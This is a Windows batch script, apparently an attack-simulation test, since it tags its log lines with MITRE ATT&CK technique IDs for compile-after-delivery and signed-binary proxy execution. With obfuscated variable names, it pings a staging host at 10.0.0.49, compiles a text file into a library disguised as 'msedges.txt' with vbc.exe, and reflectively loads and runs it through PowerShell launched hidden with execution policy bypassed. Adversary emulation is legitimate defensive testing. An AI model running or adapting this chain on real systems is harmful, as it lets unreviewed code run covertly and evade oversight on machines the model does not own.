@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET kktyh=%APPDATA%\8583\c27ebf51
SET qmtu=https://10.0.0.49
SET wqfkw=https://10.0.0.49/stage/2/icon.png?8583-7
SET nktn=ITZEL-S2BS
SET zgqd=7
SET xxdx=msedges.txt
SET pnpq=file.txt
SET ydyw=8583
SET wlkts=%APPDATA%\!zgqd!\macula-simulations.log
SET flnqq=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe

echo [!DATE! !TIME!][DEBUG][!nktn!]: heartbeat_start>> "!wlkts!" 2>nul
curl -k -s -o nul "!wqfkw!"
echo [!DATE! !TIME!][DEBUG][!nktn!]: heartbeat_complete>> "!wlkts!" 2>nul

SET cok=1
SET mtnv=
echo [!DATE! !TIME!][DEBUG][!nktn!]: chdir_start>> "!wlkts!" 2>nul
cd /d "!kktyh!"
IF ERRORLEVEL 1 SET cok=0&SET mtnv=access_denied
echo [!DATE! !TIME!][!nktn!]: !zgqd!-!ydyw!-T1500|Compile After Delivery=!cok!:!mtnv!>> "!wlkts!" 2>nul
echo [!DATE! !TIME!][DEBUG][!nktn!]: chdir_complete>> "!wlkts!" 2>nul

SET ljkfd=1
SET krth=
echo [!DATE! !TIME!][DEBUG][!nktn!]: compile_start>> "!wlkts!" 2>nul
vbc.exe /target:library /out:"!xxdx!" "!pnpq!"
IF ERRORLEVEL 1 SET ljkfd=0&SET krth=compile_failed
echo [!DATE! !TIME!][DEBUG][!nktn!]: compile_complete>> "!wlkts!" 2>nul

SET nncx=1
SET gfnb=
echo [!DATE! !TIME!][DEBUG][!nktn!]: execute_start>> "!wlkts!" 2>nul
!flnqq! -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!xxdx!')).EntryPoint.Invoke($null, @(,[string[]]@())) }"
IF ERRORLEVEL 1 SET nncx=0&SET gfnb=assembly_load_failed
echo [!DATE! !TIME!][!nktn!]: !zgqd!-!ydyw!-T1218|Signed Binary Proxy Execution=!nncx!:!gfnb!>> "!wlkts!" 2>nul
echo [!DATE! !TIME!][DEBUG][!nktn!]: execute_complete>> "!wlkts!" 2>nul
ENDLOCAL